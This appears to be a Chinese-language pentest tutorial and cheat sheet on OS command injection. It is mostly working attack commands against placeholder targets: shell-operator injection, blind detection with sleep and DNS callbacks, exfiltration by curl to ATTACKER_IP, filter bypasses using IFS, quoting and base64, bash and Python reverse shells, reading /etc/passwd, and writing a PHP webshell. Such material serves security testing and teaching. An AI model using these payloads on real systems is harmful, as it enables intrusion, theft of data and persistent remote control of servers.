## 理論基礎：命令注入成因

```php
// 典型 PHP 弱點模式
system("ping -c 1 " . $_GET['ip']);
// 若 ip=127.0.0.1; whoami → 執行 ping 後再執行 whoami

// Node.js
child_process.exec(`ping -c 1 ${req.query.ip}`);
```

| Shell 運算子 | 行為 | 範例 |
|-------------|------|------|
| `;` | 前後都執行 | `ip; whoami` |
| `\n` / `%0a` | 換行分隔 | `ip%0awhoami` |
| `&&` | 前者成功才執行後者 | `ip && whoami` |
| `\|\|` | 前者失敗才執行後者 | `fakecmd \|\| whoami` |
| `\|` | 前者輸出傳給後者 | `ip \| whoami` |
| `` `cmd` `` | 子殼層替換 | `` `whoami` `` |
| `$(cmd)` | 子殼層替換 | `$(whoami)` |

## 方法一：基本注入確認（有回顯）

```bash
# 測試注入點（在瀏覽器或 Burp 中修改參數）
# 原始請求：GET /ping?ip=127.0.0.1
# 測試：
ip=127.0.0.1; whoami
ip=127.0.0.1 && whoami
ip=127.0.0.1 | whoami
ip=127.0.0.1%0awhoami          # URL 編碼換行
ip=127.0.0.1$(whoami)          # 命令替換

# curl 測試（注意 shell 特殊符號需引號或編碼）
curl "http://TARGET/ping?ip=127.0.0.1%3Bwhoami"
# %3B → ; 的 URL 編碼

curl -X POST http://TARGET/ping \
  --data "ip=127.0.0.1;whoami"
# 直接 POST，不需 URL 編碼 body

# 確認有命令注入
curl "http://TARGET/ping?ip=127.0.0.1;id"
# 若回應中出現 uid=33(www-data)... → 命令注入確認

# 讀取敏感檔案
curl "http://TARGET/ping?ip=127.0.0.1;cat+/etc/passwd"
# + → 空白的 URL 編碼（GET 參數中）

# 列出目錄
curl "http://TARGET/ping?ip=127.0.0.1;ls+-la"
```

## 方法二：盲注型命令注入（無回顯）

```bash
# 方式一：時間差（SLEEP）
# 基線測試（正常回應時間）
time curl "http://TARGET/ping?ip=127.0.0.1"

# 注入 sleep（Linux）
time curl "http://TARGET/ping?ip=127.0.0.1;sleep+5"
# 若回應延遲約 5 秒 → 命令注入確認（排除網路抖動）

# Windows 延遲（ping 本機 N 次作為延遲）
curl "http://TARGET/ping?ip=127.0.0.1%26ping+-n+5+127.0.0.1"
# & → %26（URL 編碼）
# ping -n 5 → Windows 延遲約 5 秒

# 方式二：DNS Callback（最可靠）
# 使用 Burp Collaborator 或 interactsh
# 1. 產生唯一子網域：xxxx.burpcollaborator.net 或 xxxx.oast.me
# 2. 注入：
curl "http://TARGET/ping?ip=127.0.0.1;nslookup+xxxx.burpcollaborator.net"
curl "http://TARGET/ping?ip=127.0.0.1;curl+http://xxxx.burpcollaborator.net"
# 若 Collaborator 收到 DNS/HTTP 查詢 → 命令注入確認

# 方式三：寫入檔案（有 web 讀取能力）
curl "http://TARGET/ping?ip=127.0.0.1;echo+proof+>+/var/www/html/proof.txt"
curl "http://TARGET/proof.txt"
# 若能讀到 "proof" → 命令注入確認

# 方式四：帶外資料外洩（exfiltrate）
curl "http://TARGET/ping?ip=127.0.0.1;curl+http://ATTACKER_IP/$(whoami)"
# 攻擊者收到 HTTP 請求中包含命令輸出
# 在攻擊機先開 nc：nc -lvnp 80
```

## 方法三：繞過過濾器

```bash
# 繞過 空白過濾
# Linux IFS（Internal Field Separator）
ip=127.0.0.1${IFS}whoami
# ${IFS} → bash 環境變數，預設是空白/Tab/換行

# Tab 替代空白
ip=127.0.0.1%09whoami
# %09 → Tab 的 URL 編碼

# brace expansion（無需空白）
ip=127.0.0.1;{cat,/etc/passwd}
# {cmd,arg} → bash brace expansion

# 繞過 關鍵字過濾（whoami/cat/ls 被擋）
# 插入引號
w'h'o'a'm'i          # 在關鍵字中插入引號
c"a"t /etc/passwd     # 同上

# 插入反斜線（Linux）
w\hoami               # \ 可插入命令中間

# 大小寫混用（部分黑名單區分大小寫）
WhOaMi                # 在 bash 中大小寫敏感，通常無效
# 但在 Windows cmd 中不敏感

# 反轉後執行（Linux）
echo "imaohw" | rev   # 輸出 whoami
# 注入：$(rev<<<imaohw) 或 `echo imaohw | rev`

# base64 解碼執行
echo d2hvYW1p | base64 -d | bash
# d2hvYW1p → base64("whoami")
# 注入：$(echo${IFS}d2hvYW1p|base64${IFS}-d|bash)

# 繞過 斜線(/) 過濾（路徑）
# 用環境變數拼接
echo ${PATH:0:1}    # 輸出 /（PATH 第一個字元通常是 /）
# 注入：cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
# → cat /etc/passwd

# 用 $HOME 或其他已知含 / 的變數
echo ${HOME}        # /root 或 /home/user

# Windows 繞過技巧
who^ami             # ^ 是轉義符，cmd 會忽略它
# 插入環境變數字元
%COMSPEC:~0,1%      # cmd.exe 的路徑，取第一個字元（C）
```

## 方法四：取得 Reverse Shell

```bash
# 在攻擊機先開監聽
nc -lvnp 4444
# -l → listen 模式
# -v → verbose
# -n → 不解析 DNS
# -p 4444 → 監聽 Port 4444

# 注入 Reverse Shell（Bash）
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# URL 編碼版本：
curl "http://TARGET/ping?ip=127.0.0.1;bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261"

# 若含特殊符號需用 base64 傳遞
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64
# → YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBSy4uLi80NDQ0IDA+JjE=

# 注入 base64 payload
curl "http://TARGET/ping?ip=127.0.0.1;echo${IFS}BASE64STRING|base64${IFS}-d|bash"

# Python Reverse Shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'

# 寫入 webshell
curl "http://TARGET/ping?ip=127.0.0.1;echo+PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=|base64+-d+>+/var/www/html/shell.php"
# 解碼後是：<?php system($_GET['cmd']);?>
curl "http://TARGET/shell.php?cmd=id"
# 驗證 webshell 有效
```

## 速查表

```bash
# 基本確認（有回顯）
curl "http://TARGET/vuln?param=test;id"
curl "http://TARGET/vuln?param=test%0awhoami"

# 盲注時間差
time curl "http://TARGET/vuln?param=test;sleep+5"

# DNS Callback（盲注確認）
curl "http://TARGET/vuln?param=test;nslookup+xxxx.burpcollaborator.net"
curl "http://TARGET/vuln?param=test;curl+http://ATTACKER_IP/$(id)"

# 繞過空白
${IFS}、%09

# 繞過關鍵字
w'h'o'a'm'i
$(echo${IFS}d2hvYW1p|base64${IFS}-d)

# Reverse Shell（先開 nc -lvnp 4444）
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# base64 傳遞（繞過特殊符號過濾）
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64
# 注入：echo${IFS}BASE64|base64${IFS}-d|bash
```
